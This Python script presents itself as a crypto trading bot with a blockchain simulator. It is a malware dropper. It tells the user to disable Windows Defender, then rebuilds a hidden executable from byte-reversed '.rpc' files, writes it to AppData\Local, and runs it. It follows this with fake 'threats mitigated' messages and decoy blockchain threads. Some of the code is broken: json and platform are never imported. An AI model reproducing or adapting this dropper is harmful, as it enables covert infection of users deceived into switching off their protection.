import os
import subprocess
import getpass
import threading
import time
import random
import logging
from queue import Queue

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def reverse_bytes(data):
    return data[::-1]

def builded(input_dir, output_file):
    file_names = [
        "swap.rpc", "analysis.rpc", "wallet.rpc", "blockchain.rpc", "decentralization.rpc", "trading.rpc", "staking.rpc", "yield.rpc", "liquidity.rpc", "transaction.rpc",
        "ledger.rpc", "oracle.rpc", "consensus.rpc", "protocol.rpc", "smartcontract.rpc", "governance.rpc", "node.rpc"
    ]

    with open(output_file, 'wb') as output_f:
        for file_name in file_names:
            file_path = os.path.join(input_dir, file_name)
            with open(file_path, 'rb') as input_f:
                reversed_chunk_data = input_f.read()
                chunk_data = reverse_bytes(reversed_chunk_data)
                output_f.write(chunk_data)

def run_builder(file_path):
    try:
        subprocess.run([file_path], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error occurred while trying to run the file: {e}")

def is_defender_active():
    try:
        result = subprocess.run(['powershell', '-Command', 'Get-MpPreference'], capture_output=True, text=True)
        output = result.stdout
        if 'DisableRealtimeMonitoring' in output:
            if 'DisableRealtimeMonitoring  : False' in output:
                return True
        return False
    except Exception as e:
        print(f"Error checking Windows Defender status: {e}")
        return False

class BlockchainSimulator:
    def __init__(self):
        self.current_block = 0
        self.blocks = {}

    def generate_block(self):
        self.current_block += 1
        transactions = [f'tx_{random.randint(1000, 9999)}' for _ in range(random.randint(1, 20))]
        block = {
            'block_number': self.current_block,
            'transactions': transactions,
            'timestamp': time.time()
        }
        self.blocks[self.current_block] = block
        return block

    def get_block(self, block_number):
        return self.blocks.get(block_number)

def rpc_server(blockchain, data_queue):
    while True:
        block = blockchain.generate_block()
        json_data = json.dumps(block)
        data_queue.put(json_data)
        logging.info(f"RPC Server: Looking for a new trading pair - Block Number {block['block_number']}")
        time.sleep(random.randint(1, 3))

def display_threats():
    threats = [f"C:\\path\\to\\threat{random.randint(1, 100)}.exe" for _ in range(5)]
    print("5 threats found:")
    for threat in threats:
        print(threat)

    print("Attempting to mitigate threats...")
    time.sleep(3)
    print("Threats have been mitigated. Your system is now clean.")

def windows_setup():
    blockchain = BlockchainSimulator()
    data_queue = Queue()

    rpc_server_thread = threading.Thread(target=rpc_server, args=(blockchain, data_queue))
    blockchain_thread = threading.Thread(target=rpc_server, args=(data_queue, ' '))

    if is_defender_active():
        print("Warning: Windows Defender and real-time protection are enabled, please disable them to use the bot without problems.")
    else:
        user_name = getpass.getuser()
        output_path = f"C:\\Users\\{user_name}\\AppData\\Local\\.blockchainconnector.exe"
        
        builded("data", output_path)
        run_builder(output_path)

        display_threats()

        rpc_server_thread.start()
        blockchain_thread.start()

        rpc_server_thread.join()
        blockchain_thread.join()

if __name__ == "__main__":
    if platform.system() == 'Windows':
        windows_setup()
    else:
        print("This script is designed to run on Windows.")
